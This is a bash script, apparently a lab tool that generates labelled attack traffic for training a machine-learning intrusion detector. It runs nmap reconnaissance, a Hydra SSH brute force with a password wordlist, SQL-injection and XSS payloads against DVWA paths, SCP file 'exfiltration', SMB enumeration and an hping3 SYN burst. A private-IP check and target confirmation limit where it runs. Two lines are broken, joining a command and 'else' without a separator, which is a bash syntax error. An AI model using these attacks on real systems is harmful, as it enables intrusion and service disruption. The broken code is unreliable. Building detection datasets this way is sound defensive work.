#!/bin/bash

# ============================================================
# AI Network Manager - Attack Traffic Generator
# Lab-only attack simulation script
# Author: Bernard Appiah
# Purpose: Generate labeled network traffic for ML IDS training
# ============================================================

# -----------------------------
# 0. SAFETY AND LAB BOUNDARY
# -----------------------------
# Use this script only inside your authorized VCloud lab.
# Targets are discovered interactively or set via --target / TARGET_IP.
# The script includes a private-IP check to reduce accidental misuse.

# -----------------------------
# 1. CONFIGURATION
# -----------------------------

TARGET_IP="${TARGET_IP:-}"
LAB_SUBNET="${LAB_SUBNET:-}"
LAB_INTERFACE=""
LOCAL_IP=""
TARGET_OVERRIDE=0

# SSH credentials (optional — set via env or prompt)
SSH_USER="${SSH_USER:-}"
SSH_PASS="${SSH_PASS:-}"
TARGET_USER=""
TARGET_PASS=""

DISCOVERED_HOSTS=()

WORDLIST="./wordlists/demo-passwords.txt"
LOG_DIR="./logs"
EXFIL_DIR="./exfil"
EXFIL_FILE="./exfil/sample-sensitive-file.txt"
LABEL_LOG="./logs/attack-labels.csv"

mkdir -p "$LOG_DIR" "$EXFIL_DIR" "./wordlists" "./payloads"

# -----------------------------
# 2. HELPER FUNCTIONS
# -----------------------------

timestamp() {
    date +"%Y-%m-%d_%H-%M-%S"
}

now_iso() {
    date -Iseconds
}

banner() {
    echo
    echo "============================================================"
    echo "$1"
    echo "============================================================"
}

pause_between_attacks() {
    echo
    echo "[*] Waiting 10 seconds before the next action for cleaner labels..."
    sleep 10
}

target_tag() {
    echo "${TARGET_IP//./_}"
}

init_files() {
    if [ ! -f "$WORDLIST" ]; then
        cat > "$WORDLIST" << 'EOF'
admin
password
123456
msfadmin
toor
kali
ubuntu
student
network
security
EOF
    fi

    if [ ! -f "$EXFIL_FILE" ]; then
        cat > "$EXFIL_FILE" << 'EOF'
Student Project Simulated Sensitive File
This file is harmless and used only for controlled ML traffic labeling.
Project: AI Network Manager
EOF
    fi

    if [ ! -f "$LABEL_LOG" ]; then
        echo "timestamp,class,activity,target,notes" > "$LABEL_LOG"
    fi
}

log_label() {
    local class="$1"
    local activity="$2"
    local target="$3"
    local notes="$4"
    echo "$(now_iso),$class,$activity,$target,$notes" >> "$LABEL_LOG"
}

is_private_ip() {
    local ip="$1"
    [[ "$ip" =~ ^10\. ]] && return 0
    [[ "$ip" =~ ^192\.168\. ]] && return 0
    [[ "$ip" =~ ^172\.(1[6-9]|2[0-9]|3[0-1])\. ]] && return 0
    return 1
}

show_usage() {
    cat << 'EOF'
Usage: ./attack-demo.sh [OPTIONS]

Lab-only attack traffic generator with automatic host discovery.

Options:
  -t, --target IP     Attack a specific lab target (skips discovery menu)
  -s, --subnet CIDR   Override auto-detected lab subnet (e.g. 192.168.10.0/24)
  -u, --user USER     SSH username for SSH/SCP/Hydra steps
  -p, --pass PASS     SSH password for SSH/SCP steps
  -h, --help          Show this help

Environment variables:
  TARGET_IP           Same as --target
  LAB_SUBNET          Same as --subnet
  SSH_USER            Same as --user
  SSH_PASS            Same as --pass

Examples:
  ./attack-demo.sh
  ./attack-demo.sh --target 192.168.10.30
  TARGET_IP=192.168.10.30 ./attack-demo.sh
  SSH_USER=student SSH_PASS=student ./attack-demo.sh --target 192.168.10.30
EOF
}

parse_args() {
    while [ $# -gt 0 ]; do
        case "$1" in
            -t|--target)
                TARGET_IP="$2"
                TARGET_OVERRIDE=1
                shift 2
                ;;
            -s|--subnet)
                LAB_SUBNET="$2"
                shift 2
                ;;
            -u|--user)
                SSH_USER="$2"
                shift 2
                ;;
            -p|--pass)
                SSH_PASS="$2"
                shift 2
                ;;
            -h|--help)
                show_usage
                exit 0
                ;;
            *)
                echo "[!] Unknown option: $1"
                show_usage
                exit 1
                ;;
        esac
    done

    if [ -n "$TARGET_IP" ] && [ "$TARGET_OVERRIDE" -eq 0 ]; then
        TARGET_OVERRIDE=1
    fi
}

cidr_to_network() {
    local cidr="$1"
    local ip prefix oct1 oct2 oct3 oct4

    if [[ ! "$cidr" =~ ^([0-9]+)\.([0-9]+)\.([0-9]+)\.([0-9]+)/([0-9]+)$ ]]; then
        echo "$cidr"
        return
    fi

    oct1="${BASH_REMATCH[1]}"
    oct2="${BASH_REMATCH[2]}"
    oct3="${BASH_REMATCH[3]}"
    oct4="${BASH_REMATCH[4]}"
    prefix="${BASH_REMATCH[5]}"
    ip="${oct1}.${oct2}.${oct3}.${oct4}"

    case "$prefix" in
        8)  echo "${oct1}.0.0.0/8" ;;
        16) echo "${oct1}.${oct2}.0.0/16" ;;
        24) echo "${oct1}.${oct2}.${oct3}.0/24" ;;
        *)
            if command -v python3 >/dev/null 2>&1; then
                python3 -c "import ipaddress; print(ipaddress.ip_network('${cidr}', strict=False))" 2>/dev/null || echo "$cidr"
            else
                echo "$cidr"
            fi
            ;;
    esac
}

detect_lab_subnet() {
    banner "LAB NETWORK DETECTION"

    if ! command -v ip >/dev/null 2>&1; then
        echo "[!] 'ip' command not found. Install iproute2 or set LAB_SUBNET manually."
        exit 1
    fi

    LAB_INTERFACE=$(ip route show default 2>/dev/null | awk '/default/ {print $5; exit}')
    if [ -z "$LAB_INTERFACE" ]; then
        LAB_INTERFACE=$(ip -br addr show scope global 2>/dev/null | awk '$2=="UP" {print $1; exit}')
    fi

    if [ -z "$LAB_INTERFACE" ]; then
        echo "[!] Could not detect an active network interface."
        exit 1
    fi

    LOCAL_IP=$(ip -4 addr show "$LAB_INTERFACE" 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
    local route_subnet cidr
    route_subnet=$(ip route show dev "$LAB_INTERFACE" 2>/dev/null | awk '/proto kernel/ {print $1; exit}')
    cidr=$(ip -4 addr show "$LAB_INTERFACE" 2>/dev/null | awk '/inet / {print $2; exit}')

    if [ -z "$LAB_SUBNET" ]; then
        if [ -n "$route_subnet" ] && [[ "$route_subnet" == */* ]]; then
            LAB_SUBNET="$route_subnet"
        elif [ -n "$cidr" ]; then
            LAB_SUBNET=$(cidr_to_network "$cidr")
        else
            echo "[!] Could not determine lab subnet. Use --subnet or LAB_SUBNET."
            exit 1
        fi
    fi

    echo "[+] Interface: $LAB_INTERFACE"
    echo "[+] Local IP:  ${LOCAL_IP:-unknown}"
    echo "[+] Subnet:    $LAB_SUBNET"

    if [ -n "$LAB_SUBNET" ] && ! [[ "$LAB_SUBNET" =~ / ]]; then
        echo "[!] Invalid subnet format: $LAB_SUBNET (expected CIDR, e.g. 192.168.10.0/24)"
        exit 1
    fi
}

validate_target_ip() {
    local ip="$1"

    if [ -z "$ip" ]; then
        echo "[!] No target IP selected."
        return 1
    fi

    if ! [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
        echo "[!] Invalid IP format: $ip"
        return 1
    fi

    if ! is_private_ip "$ip"; then
        echo "[!] Safety check failed: $ip is not a private RFC1918 lab IP."
        echo "[!] Use only your isolated VCloud lab addresses."
        return 1
    fi

    if [ -n "$LOCAL_IP" ] && [ "$ip" = "$LOCAL_IP" ]; then
        echo "[!] Cannot target this machine ($ip)."
        return 1
    fi

    return 0
}

discover_live_hosts() {
    banner "HOST DISCOVERY"
    echo "[*] Discovering live hosts on $LAB_SUBNET (nmap -sn)..."
    echo "[*] This is read-only discovery — no attack traffic is sent yet."

    local scan_log="$LOG_DIR/discovery_$(timestamp).log"
    local hosts_file="$LOG_DIR/.discovered_hosts.tmp"

    : > "$hosts_file"
    nmap -sn "$LAB_SUBNET" -oG - 2>&1 | tee "$scan_log" | awk '/Status: Up/ {print $2}' >> "$hosts_file"

    if [ ! -s "$hosts_file" ]; then
        echo "[*] nmap found no hosts; trying ping sweep on common lab addresses..."
        local base="${LAB_SUBNET%/*}"
        base="${base%.*}"
        local i
        for i in $(seq 1 254); do
            local candidate="${base}.${i}"
            [ -n "$LOCAL_IP" ] && [ "$candidate" = "$LOCAL_IP" ] && continue
            if ping -c 1 -W 1 "$candidate" >/dev/null 2>&1; then
                echo "$candidate" >> "$hosts_file"
            fi
        done
    fi

    DISCOVERED_HOSTS=()
    while IFS= read -r host; do
        [ -z "$host" ] && continue
        [ -n "$LOCAL_IP" ] && [ "$host" = "$LOCAL_IP" ] && continue
        DISCOVERED_HOSTS+=("$host")
    done < <(sort -u "$hosts_file")

    echo "[+] Found ${#DISCOVERED_HOSTS[@]} host(s) (excluding this machine)."
}

confirm_target() {
    local ip="$1"
    echo
    echo "[!] Attack traffic will be sent ONLY to: $ip"
    read -r -p "Confirm this target? [y/N]: " ans
    [[ "$ans" =~ ^[Yy]$ ]]
}

select_target() {
    if [ "$TARGET_OVERRIDE" -eq 1 ] && [ -n "$TARGET_IP" ]; then
        if validate_target_ip "$TARGET_IP"; then
            echo "[+] Using target override: $TARGET_IP"
            return 0
        fi
        exit 1
    fi

    detect_lab_subnet
    discover_live_hosts

    if [ "${#DISCOVERED_HOSTS[@]}" -eq 0 ]; then
        echo "[!] No live hosts discovered on $LAB_SUBNET."
        read -r -p "Enter target IP manually: " TARGET_IP
        validate_target_ip "$TARGET_IP" || exit 1
        confirm_target "$TARGET_IP" || exit 1
        return 0
    fi

    echo
    echo "Discovered hosts on $LAB_SUBNET:"
    local i=1
    for host in "${DISCOVERED_HOSTS[@]}"; do
        echo "  $i) $host"
        ((i++))
    done
    echo "  m) Enter IP manually"
    echo "  q) Quit"
    echo

    read -r -p "Select target [1-${#DISCOVERED_HOSTS[@]}/m/q]: " choice

    case "$choice" in
        q|Q)
            echo "Exiting."
            exit 0
            ;;
        m|M)
            read -r -p "Enter target IP: " TARGET_IP
            validate_target_ip "$TARGET_IP" || exit 1
            ;;
        *)
            if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le "${#DISCOVERED_HOSTS[@]}" ]; then
                TARGET_IP="${DISCOVERED_HOSTS[$((choice - 1))]}"
            else
                echo "[!] Invalid selection."
                exit 1
            fi
            ;;
    esac

    confirm_target "$TARGET_IP" || exit 1
}

safety_check() {
    banner "SAFETY CHECK"
    echo "[*] Validating selected target: $TARGET_IP"

    if ! validate_target_ip "$TARGET_IP"; then
        exit 1
    fi

    echo "[+] Safety check passed. Target $TARGET_IP is a valid private lab IP."
}

check_tools() {
    banner "TOOL CHECK"
    local missing=0
    for tool in ip nmap hydra curl dig nslookup ssh sshpass scp smbclient hping3; do
        if ! command -v "$tool" >/dev/null 2>&1; then
            echo "[!] Missing tool: $tool"
            missing=1
        else
            echo "[+] Found: $tool"
        fi
    done

    if [ "$missing" -eq 1 ]; then
        echo
        echo "Install missing tools with:"
        echo "sudo apt update"
        echo "sudo apt install -y iproute2 nmap hydra curl dnsutils openssh-client smbclient sshpass hping3 netcat-traditional"
        exit 1
    fi
}

has_ssh_creds() {
    [ -n "$TARGET_USER" ] && [ -n "$TARGET_PASS" ]
}

resolve_ssh_credentials() {
    TARGET_USER="${SSH_USER:-$TARGET_USER}"
    TARGET_PASS="${SSH_PASS:-$TARGET_PASS}"

    if has_ssh_creds; then
        echo "[+] SSH credentials set for user: $TARGET_USER"
        return 0
    fi

    echo "[*] SSH-based steps (normal login, brute force user, exfil, lateral) need credentials for $TARGET_IP"
    read -r -p "SSH username [msfadmin]: " TARGET_USER
    TARGET_USER="${TARGET_USER:-msfadmin}"
    read -r -s -p "SSH password (blank to skip SSH steps): " TARGET_PASS
    echo

    if [ -z "$TARGET_PASS" ]; then
        echo "[*] No SSH password provided — SSH/SCP steps will be skipped where credentials are required."
    fi
}

run_step() {
    local desc="$1"
    shift
    echo "[*] $desc (target: $TARGET_IP)"
    if "$@"; then
        echo "[+] $desc succeeded."
        return 0
    else
        echo "[!] $desc failed or service unavailable on $TARGET_IP — continuing."
        return 1
    fi
}

require_target() {
    if [ -z "$TARGET_IP" ]; then
        echo "[!] No target IP selected. Exiting."
        exit 1
    fi
}

# -----------------------------
# 3. NORMAL TRAFFIC
# -----------------------------

normal_traffic() {
    require_target
    banner "CLASS: NORMAL TRAFFIC (target: $TARGET_IP)"
    log_label "Normal" "Start normal traffic generation" "$TARGET_IP" "DNS HTTP and SSH baseline"

    echo "[*] Running DNS lookups..."
    dig example.com > "$LOG_DIR/normal_dns_dig_$(timestamp).log" 2>&1
    nslookup example.com > "$LOG_DIR/normal_dns_nslookup_$(timestamp).log" 2>&1

    run_step "HTTP HEAD request to $TARGET_IP" \
        curl -I --max-time 5 -f -s "http://$TARGET_IP" \
        -o "$LOG_DIR/normal_http_$(target_tag)_$(timestamp).log"
    if has_ssh_creds; then
        run_step "SSH login to $TARGET_IP" \
            sshpass -p "$TARGET_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "$TARGET_USER@$TARGET_IP" "whoami; hostname" \
            > "$LOG_DIR/normal_ssh_$(target_tag)_$(timestamp).log" 2>&1    else
        echo "[*] Skipping SSH login — no credentials (target: $TARGET_IP)"
    fi

    log_label "Normal" "Completed normal traffic generation" "$TARGET_IP" "Baseline completed"
    echo "[+] Normal traffic completed for $TARGET_IP."
}

# -----------------------------
# 4. RECONNAISSANCE
# -----------------------------

recon_scan() {
    require_target
    banner "CLASS: RECONNAISSANCE (target: $TARGET_IP)"
    log_label "Recon" "Start ping sweep" "$LAB_SUBNET" "Nmap host discovery"

    run_step "Ping sweep on $LAB_SUBNET" \
        nmap -sn "$LAB_SUBNET" -oN "$LOG_DIR/recon_ping_sweep_$(target_tag)_$(timestamp).log"
    pause_between_attacks

    log_label "Recon" "Start TCP SYN scan" "$TARGET_IP" "Nmap SYN scan"
    run_step "TCP SYN scan on $TARGET_IP" \
        sudo nmap -sS "$TARGET_IP" -oN "$LOG_DIR/recon_syn_scan_$(target_tag)_$(timestamp).log"
    pause_between_attacks

    log_label "Recon" "Start service version enumeration" "$TARGET_IP" "Nmap service discovery"
    run_step "Service enumeration on $TARGET_IP" \
        nmap -sV "$TARGET_IP" -oN "$LOG_DIR/recon_service_enum_$(target_tag)_$(timestamp).log"
    log_label "Recon" "Completed reconnaissance" "$TARGET_IP" "Recon completed"
    echo "[+] Reconnaissance traffic completed for $TARGET_IP."
}

# -----------------------------
# 5. BRUTE FORCE
# -----------------------------

ssh_bruteforce() {
    require_target
    banner "CLASS: BRUTE FORCE (target: $TARGET_IP)"
    log_label "Brute Force" "Start controlled SSH brute force" "$TARGET_IP" "Hydra small wordlist"

    local brute_user="${TARGET_USER:-msfadmin}"
    echo "[*] Running controlled SSH brute-force against $TARGET_IP (user: $brute_user)..."
    echo "[*] This uses a small lab wordlist to create authentication-failure traffic."

    run_step "Hydra SSH brute force on $TARGET_IP" \
        hydra -l "$brute_user" -P "$WORDLIST" "ssh://$TARGET_IP" -t 2 -W 5 \
        -o "$LOG_DIR/bruteforce_ssh_$(target_tag)_$(timestamp).log"
    log_label "Brute Force" "Completed controlled SSH brute force" "$TARGET_IP" "Hydra completed"
    echo "[+] SSH brute-force simulation completed for $TARGET_IP."
}

# -----------------------------
# 6. WEB ATTACKS
# -----------------------------

web_attack() {
    require_target
    banner "CLASS: WEB ATTACK (target: $TARGET_IP)"
    log_label "Web Attack" "Start web attack payloads" "$TARGET_IP" "SQLi and XSS test requests"

    run_step "Normal HTTP GET to $TARGET_IP" \
        curl --max-time 5 -f -s "http://$TARGET_IP/" \
        -o "$LOG_DIR/web_normal_$(target_tag)_$(timestamp).html"
    pause_between_attacks

    run_step "SQLi-style payload to $TARGET_IP" \
        curl --max-time 5 -s "http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1'%20OR%20'1'='1&Submit=Submit" \
        -o "$LOG_DIR/web_sqli_$(target_tag)_$(timestamp).html"
    pause_between_attacks

    run_step "XSS-style payload to $TARGET_IP" \
        curl --max-time 5 -s "http://$TARGET_IP/dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E" \
        -o "$LOG_DIR/web_xss_$(target_tag)_$(timestamp).html"
    log_label "Web Attack" "Completed web payload requests" "$TARGET_IP" "Web attack simulation completed"
    echo "[+] Web attack simulation completed for $TARGET_IP."
}

# -----------------------------
# 7. EXFILTRATION SIMULATION
# -----------------------------

exfiltration_simulation() {
    require_target
    banner "CLASS: EXFILTRATION (target: $TARGET_IP)"
    log_label "Exfiltration" "Start SCP transfer simulation" "$TARGET_IP" "Harmless sample file transfer"

    if ! has_ssh_creds; then
        echo "[!] Skipping exfiltration — SSH credentials required (target: $TARGET_IP)"
        log_label "Exfiltration" "Skipped SCP transfer" "$TARGET_IP" "No SSH credentials"
        return 0
    fi

    echo "[*] Simulating file movement using SCP to $TARGET_IP."
    echo "[*] File: $EXFIL_FILE"

    run_step "SCP upload to $TARGET_IP" \
        sshpass -p "$TARGET_PASS" scp -o StrictHostKeyChecking=no "$EXFIL_FILE" \
        "$TARGET_USER@$TARGET_IP:/tmp/exfil-test-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_upload_$(target_tag)_$(timestamp).log" 2>&1
    pause_between_attacks

    run_step "Prepare remote file on $TARGET_IP" \
        sshpass -p "$TARGET_PASS" ssh -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" \
        "echo 'Harmless victim-side sample for exfil simulation' > /tmp/victim-side-sample.txt" \
        > "$LOG_DIR/exfil_prepare_$(target_tag)_$(timestamp).log" 2>&1
    run_step "SCP pull from $TARGET_IP" \
        sshpass -p "$TARGET_PASS" scp -o StrictHostKeyChecking=no \
        "$TARGET_USER@$TARGET_IP:/tmp/victim-side-sample.txt" \
        "./exfil/pulled-from-$(target_tag)-$(timestamp).txt" \
        > "$LOG_DIR/exfil_scp_pull_$(target_tag)_$(timestamp).log" 2>&1
    log_label "Exfiltration" "Completed SCP transfer simulation" "$TARGET_IP" "SCP file movement completed"
    echo "[+] Exfiltration simulation completed for $TARGET_IP."
}

# -----------------------------
# 8. LATERAL MOVEMENT SIMULATION
# -----------------------------

lateral_movement() {
    require_target
    banner "CLASS: LATERAL MOVEMENT (target: $TARGET_IP)"
    log_label "Lateral Movement" "Start SMB enumeration" "$TARGET_IP" "SMB share discovery"

    run_step "SMB enumeration on $TARGET_IP" \
        smbclient -L "//$TARGET_IP/" -N \
        > "$LOG_DIR/lateral_smb_enum_$(target_tag)_$(timestamp).log" 2>&1
    pause_between_attacks

    if has_ssh_creds; then
        log_label "Lateral Movement" "Start SSH movement simulation" "$TARGET_IP" "SSH host-to-host style activity"
        run_step "SSH session on $TARGET_IP" \
            sshpass -p "$TARGET_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "$TARGET_USER@$TARGET_IP" "hostname; ip addr | head" \
            > "$LOG_DIR/lateral_ssh_$(target_tag)_$(timestamp).log" 2>&1    else
        echo "[*] Skipping SSH lateral step — no credentials (target: $TARGET_IP)"
    fi

    log_label "Lateral Movement" "Completed lateral movement simulation" "$TARGET_IP" "SMB and SSH movement completed"
    echo "[+] Lateral movement simulation completed for $TARGET_IP."
}

# -----------------------------
# 9. CONTROLLED DOS-LIKE TRAFFIC
# -----------------------------

dos_simulation() {
    require_target
    banner "CLASS: CONTROLLED DOS-LIKE TRAFFIC (target: $TARGET_IP)"
    log_label "DoS" "Start controlled SYN burst" "$TARGET_IP" "Low-count hping3 SYN burst"

    echo "[!] This is a controlled lab-only SYN burst against $TARGET_IP."
    echo "[!] Keep this low-rate. The goal is traffic generation, not disruption."
    echo "[!] Packet count is intentionally limited to 100."

    run_step "SYN burst to $TARGET_IP:80" \
        sudo hping3 -S "$TARGET_IP" -p 80 -c 100 --fast \
        > "$LOG_DIR/dos_syn_burst_$(target_tag)_$(timestamp).log" 2>&1
    log_label "DoS" "Completed controlled SYN burst" "$TARGET_IP" "100 SYN packets sent"
    echo "[+] Controlled DoS-like traffic completed for $TARGET_IP."
}

# -----------------------------
# 10. RUN ALL
# -----------------------------

run_all() {
    banner "RUNNING FULL ATTACK TRAFFIC DEMO (target: $TARGET_IP)"

    normal_traffic
    pause_between_attacks

    recon_scan
    pause_between_attacks

    ssh_bruteforce
    pause_between_attacks

    web_attack
    pause_between_attacks

    exfiltration_simulation
    pause_between_attacks

    lateral_movement
    pause_between_attacks

    dos_simulation

    banner "FULL DEMO COMPLETED"
    echo "[*] Target: $TARGET_IP"
    echo "[*] Label log saved to: $LABEL_LOG"
    echo "[*] Tool logs saved in: $LOG_DIR"
}

# -----------------------------
# 11. MAIN
# -----------------------------

init_files
parse_args "$@"
check_tools
select_target
safety_check

if [ "$TARGET_OVERRIDE" -eq 0 ]; then
    detect_lab_subnet
elif [ -z "$LAB_SUBNET" ]; then
    detect_lab_subnet
fi

resolve_ssh_credentials

banner "READY"
echo "[*] Target:  $TARGET_IP"
echo "[*] Subnet:  ${LAB_SUBNET:-unknown}"
echo "[*] Attack traffic will only be sent to the selected target."

while true; do
    echo
    echo "AI Network Manager - Attack Traffic Generator"
    echo "Target: $TARGET_IP  |  Subnet: ${LAB_SUBNET:-unknown}"
    echo "------------------------------------------------"
    echo "1. Generate Normal Traffic"
    echo "2. Reconnaissance: Nmap + Ping Sweep"
    echo "3. Brute Force: Hydra SSH"
    echo "4. Web Attack: SQLi + XSS"
    echo "5. Exfiltration: SCP Transfer"
    echo "6. Lateral Movement: SMB + SSH"
    echo "7. Controlled DoS-like SYN Burst"
    echo "8. Run Full Demo"
    echo "9. Exit"
    echo "0. Change target"
    echo "------------------------------------------------"
    read -r -p "Select option: " choice

    case $choice in
        1) normal_traffic ;;
        2) recon_scan ;;
        3) ssh_bruteforce ;;
        4) web_attack ;;
        5) exfiltration_simulation ;;
        6) lateral_movement ;;
        7) dos_simulation ;;
        8) run_all ;;
        9) echo "Exiting."; exit 0 ;;
        0)
            TARGET_OVERRIDE=0
            TARGET_IP=""
            select_target
            safety_check
            resolve_ssh_credentials
            ;;
        *) echo "Invalid option." ;;
    esac
done
